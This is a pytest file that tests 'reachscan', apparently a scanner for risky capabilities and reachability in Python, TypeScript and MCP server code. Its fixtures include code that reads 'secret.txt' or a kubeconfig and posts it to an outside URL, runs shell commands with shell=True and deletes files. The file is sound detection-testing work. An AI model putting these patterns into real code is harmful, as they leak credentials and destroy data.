from pathlib import Path

from reachscan.scanner import scan_path


def test_scanner_outputs_enriched_findings_and_risks(tmp_path: Path):
    demo = tmp_path / "demo.py"
    demo.write_text(
        "\n".join(
            [
                "import requests",
                'data = open("secret.txt", "r").read()',
                'requests.post("https://example.com", data=data)',
            ]
        ),
        encoding="utf-8",
    )

    report = scan_path(demo)
    assert "possible_impacts" not in report
    assert "risks" in report
    assert any(risk["id"] == "secret_leak" for risk in report["risks"])
    assert "READ" in report["capabilities"]
    assert "SEND" in report["capabilities"]

    finding = report["findings"][0]["finding"]
    assert finding.get("explanation")
    assert finding.get("impact")
    assert finding.get("risk_level") in {"medium", "high", "low"}


def test_scanner_detects_destructive_agent_risk(tmp_path: Path):
    demo = tmp_path / "demo.py"
    demo.write_text(
        "\n".join(
            [
                "import os",
                "import subprocess",
                'subprocess.run(["ls"])',
                'os.remove("out.txt")',
            ]
        ),
        encoding="utf-8",
    )

    report = scan_path(demo)
    assert any(risk["id"] == "destructive_agent" for risk in report["risks"])


def test_scanner_combined_risks_ignore_unreachable_capabilities(tmp_path: Path):
    """Combined risks run after reachability: an unreachable WRITE must not pair with a reachable SEND."""
    (tmp_path / "server.py").write_text(
        "\n".join(
            [
                "import requests",
                "from mcp.server.fastmcp import FastMCP",
                "",
                'mcp = FastMCP("x")',
                "",
                "@mcp.tool()",
                "def get(url: str) -> str:",
                "    return requests.get(url).text",
                "",
                "def unused():",
                '    open("out.txt", "w").write("y")',
            ]
        ),
        encoding="utf-8",
    )

    report = scan_path(tmp_path)
    states = {e["finding"]["capability"]: e["finding"]["reachability"] for e in report["findings"]}
    assert states.get("SEND") == "reachable"
    assert states.get("WRITE") == "unreachable"
    assert not any(risk["id"] == "data_exfiltration" for risk in report["risks"])


def test_mixed_project_python_risks_survive_ts_module_level_finding(tmp_path: Path):
    """Regression (kubernetes-manusa shape): Python with no entry points plus one TS
    module_level finding. The TS state must not switch off the Python presence fallback."""
    (tmp_path / "ops.py").write_text(
        "\n".join(
            [
                "import os",
                "import subprocess",
                "import requests",
                "",
                "def deploy(cmd, url):",
                "    subprocess.run(cmd, shell=True)",
                "    requests.post(url, data=open('kubeconfig').read())",
                "    os.remove('kubeconfig')",
            ]
        ),
        encoding="utf-8",
    )
    (tmp_path / "docs.mjs").write_text(
        'import fs from "node:fs";\nconst readme = fs.readFileSync("README.md", "utf8");\n',
        encoding="utf-8",
    )
    report = scan_path(tmp_path)
    states = {
        (Path(e["finding"]["file"]).suffix, e["finding"]["reachability"]) for e in report["findings"]
    }
    assert (".py", "no_entry_points") in states
    assert (".mjs", "module_level") in states
    risk_ids = {r["id"] for r in report["risks"]}
    assert {"remote_control", "destructive_agent"} <= risk_ids
